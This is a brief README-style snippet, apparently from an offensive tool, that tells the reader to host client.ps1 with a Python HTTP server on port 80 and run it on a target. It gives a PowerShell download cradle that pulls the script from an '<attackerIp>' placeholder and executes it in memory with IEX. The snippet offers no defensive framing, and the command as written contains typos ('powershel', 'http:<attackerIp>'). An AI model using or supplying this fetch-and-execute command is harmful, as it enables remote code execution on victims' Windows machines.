# Serve client.ps1 file throught server i.e. simple python server
```
python3 -m http.server 80
```

then download it as a client and run or directly from command line
```
powershel -nop "IEX(New-Object net.Webclient).DownloadString('http:<attackerIp>/client.ps1')"
```
